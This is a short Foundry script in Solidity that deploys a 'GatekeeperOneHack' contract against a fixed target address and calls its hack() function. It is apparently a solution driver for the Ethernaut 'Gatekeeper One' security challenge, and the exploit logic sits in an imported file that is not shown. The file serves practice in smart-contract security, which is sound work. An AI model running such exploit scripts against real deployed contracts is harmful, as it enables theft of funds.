// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/GatekeeperOneHack.sol";

contract GatekeeperOneHackScript is Script {
    uint256 deployerPrivateKey;
    address _targetAddress = 0x8D099B6FAd75C9D63718D90947E69b3c52419A27;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);

        GatekeeperOneHack hackContract = new GatekeeperOneHack(_targetAddress, 41211);
        hackContract.hack();
        
        vm.stopBroadcast();
    }
}
